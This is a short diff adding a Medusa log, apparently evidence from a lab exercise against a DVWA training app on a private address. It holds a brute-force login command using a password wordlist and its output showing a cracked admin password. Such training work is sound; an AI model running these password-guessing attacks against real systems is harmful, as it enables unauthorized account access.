@@ -1,0 +1,4 @@
+# Medusa v.2.3 (2025-11-24 07:57:02)
+# medusa -h 192.168.0.3 -u admin -P wordlists/small-passwords.txt -M http -m DIR:/dvwa/ -O evidence/dvwa_http_output.txt 
+2025-11-24 07:57:02 ACCOUNT FOUND: [http] Host: 192.168.0.3 User: admin Password: 123456 [SUCCESS]
+# Medusa has finished (2025-11-24 07:57:02).
